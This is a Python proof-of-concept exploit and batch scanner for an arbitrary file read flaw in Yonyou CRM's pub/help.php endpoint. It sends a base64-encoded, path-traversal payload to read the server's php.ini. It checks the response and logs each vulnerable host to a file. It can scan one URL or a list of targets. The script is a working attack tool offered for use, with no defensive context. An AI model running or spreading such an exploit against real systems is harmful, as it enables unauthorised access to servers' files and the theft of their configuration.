import requests
import argparse


def checkvul(url):
    # get提交数据
    data = '''/pub/help.php?key=YTozOntpOjA7czoyNDoiLy4uLy4uLy4uL2FwYWNoZS9waHAuaW5pIjtpOjE7czoxOiIxIjtpOjI7czoxOiIyIjt9'''
    # 头部信息
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Uer-Agent': 'ua.Edge'
    }
    # 拼接漏洞地址
    url1 = url + '/pub/help.php?key=YTozOntpOjA7czoyNDoiLy4uLy4uLy4uL2FwYWNoZS9waHAuaW5pIjtpOjE7czoxOiIxIjtpOjI7czoxOiIyIjt9'
    # 验证漏洞存在与否
    try:
        filename = 'crm.txt'
        res = requests.get(url1, data=data, headers=headers, timeout=6, verify=False)
        a = res.text
        #print(a)
        if 'system' in a:
            with open(filename, 'a') as f:
                f.write(url + '\n')
                print(f'{url}存在漏洞')
        else:
            print('不存在漏洞')
    except Exception as e:
        print(f'发生错误{e}')


# 批量检测
def checkvuls(filename):
    with open(filename, 'r') as f:
        for f in f.readlines():
            checkvul(f.strip())


# banner帮助信息
def banner():
    print('-u http://www.xxx.com  即可进行单个url漏洞检测')
    print('-l targetUrl.txt  即可对选中文档中的网址进行批量检测')
    print('--help 查看更多详细帮助信息')
    print('author：yui14256')


# 主程序
def main():
    arg = argparse.ArgumentParser(description='用友crm客户关系管理pub/help.php接口任意文件读取漏洞')
    arg.add_argument('-u', help='输入需要检测的url地址')
    arg.add_argument('-l', help='输入需要批量检测的url文件')
    args = arg.parse_args()
    try:
        if args.u or args.l:
            if args.u:
                checkvul(f'{args.u}')
            else:
                checkvuls(f'{args.l}')
        else:
            banner()
    except:
        print('运行出现错误')


if __name__ == '__main__':
    main()